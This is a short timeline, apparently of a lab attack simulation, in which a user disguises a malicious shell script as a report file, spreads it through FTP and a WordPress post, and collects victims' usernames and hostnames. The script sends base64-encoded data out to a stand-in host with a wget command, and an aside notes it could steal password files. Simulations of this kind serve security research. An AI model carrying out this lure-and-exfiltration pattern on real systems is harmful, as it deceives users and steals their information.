What happened:

- Start 11:45 14/03/2020
- login all users to their clients - access to Wordpress
- (install some tools, filezilla on clients)
- (sepses creates ftp_admin user on the server)
- jdoe creates Report_2019 and Report_2020 files and logs in to the FTP server (with ftp_admin) and uploads the files
- jdoe, jhalley, akep access the files via ftp and their accounts
- sepses is on the server, created an evil script "Report_2020.sh"
-- uploads the file on the FTP server next to the other report files
-- edits a wordpress post and links the "Report_2020.sh" file
- Client C3 and C2 open the wordpress post, click the download button and save the sh file on the clients
-- then they execute the file (had to set permissions locally to exectue it)
-- the script calls whoami and reads the current hostname (ip) [the script could steal much more information - pwd files for example], encodes it in base64 and calls the website "wget example.com?i=$ENCODED"
- Client C1 downloads the script file via FTP and execudes it as well
- sepses goes to the server and opens the example wodpress apache log > there he can find the ENCODED calls from the clients and knows the usersnames and their IPs
- Stop 17:22
